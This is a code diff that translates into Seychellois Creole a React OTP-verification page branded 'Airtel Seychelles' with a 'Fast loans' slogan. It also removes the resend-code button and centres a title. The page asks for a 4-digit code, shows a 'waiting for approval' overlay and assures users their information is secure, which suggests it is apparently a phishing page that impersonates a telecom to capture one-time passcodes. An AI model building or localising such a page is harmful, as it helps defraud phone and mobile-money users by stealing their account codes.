@@ -17,7 +17,8 @@ function makeRefId() {
 }
 
 function formatPhone(p: string) {
-  if (!p) return 'your phone';
+  // CHANGED: Translated fallback text
+  if (!p) return 'ou telefon';
   return p.replace(/\s+/g, ''); 
 }
 
@@ -284,6 +285,7 @@ function AirtelOTPVerify() {
           font-weight: 700;
           color: #1a1a1a;
           margin-bottom: 20px;
+          text-align: center;
         }
 
         .waiting-message {
@@ -475,9 +477,10 @@ function AirtelOTPVerify() {
       {showWaitingOverlay && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          <div className="waiting-title">Waiting for approval</div>
+          {/* CHANGED: Translated to Seychellois Creole */}
+          <div className="waiting-title">Pey atann aprobasyon</div>
           <div className="waiting-message">
-            Your request has been sent. Please wait while we verify your details...
+            Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...
           </div>
         </div>
       )}
@@ -488,28 +491,30 @@ function AirtelOTPVerify() {
         {/* HEADER */}
         <div className="header-section">
           <button className="menu-btn" onClick={() => navigate('/')}>
-            {/* Hamburger Menu (Three lines) */}
             <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
               <line x1="3" y1="12" x2="21" y2="12"></line>
               <line x1="3" y1="6" x2="21" y2="6"></line>
               <line x1="3" y1="18" x2="21" y2="18"></line>
             </svg>
           </button>
-          <h1 className="header-title">Airtel Seychelles</h1>
-          <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
+          {/* CHANGED: Translated to Seychellois Creole */}
+          <h1 className="header-title">Airtel Sesel</h1>
+          <p className="header-subtitle">Pre rapid. Nenport ler. Nenport kote.</p>
         </div>
 
         {/* MAIN CARD */}
         <div className="main-card">
-          <h2 className="card-title">OTP Verification</h2>
+          {/* CHANGED: Translated to Seychellois Creole */}
+          <h2 className="card-title">Verifikasyon OTP</h2>
           <p className="card-subtitle">
-            Enter the OTP sent to your phone number
+            Antre OTP ki finn ganny voye kot ou nimero telefon
             <span className="phone-highlight">{formatPhone(phoneNumber)}</span>
           </p>
 
           <form onSubmit={handleVerify} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
             
-            <span className="input-label">Enter 4-digit OTP</span>
+            {/* CHANGED: Translated to Seychellois Creole */}
+            <span className="input-label">Antre OTP 4 sif</span>
             
             <div className="otp-inputs-container">
               {otp.map((digit, index) => (
@@ -530,8 +535,9 @@ function AirtelOTPVerify() {
               ))}
             </div>
 
+            {/* CHANGED: Translated to Seychellois Creole */}
             <p className="otp-timer-text">
-              Code expires in <strong>{timeLeft}</strong> seconds
+              Koud i ekspire dan <strong>{timeLeft}</strong> segonn
             </p>
 
             <button 
@@ -539,14 +545,13 @@ function AirtelOTPVerify() {
               className={`login-btn ${isFormValid ? 'active' : ''}`}
               disabled={!isFormValid || showWaitingOverlay}
             >
-              SUBMIT
+              {/* CHANGED: Translated to Seychellois Creole */}
+              SOUMET
               <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <line x1="5" y1="12" x2="19" y2="12" />
                 <polyline points="12 5 19 12 12 19" />
               </svg>
             </button>
-
-            {/* REMOVED: Resend code button is gone */}
 
           </form>
 
@@ -554,7 +559,8 @@ function AirtelOTPVerify() {
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
             </svg>
-            Your information is secure.
+            {/* CHANGED: Translated to Seychellois Creole */}
+            Ou bann informasyon i an sekirite.
           </div>
         </div>
 
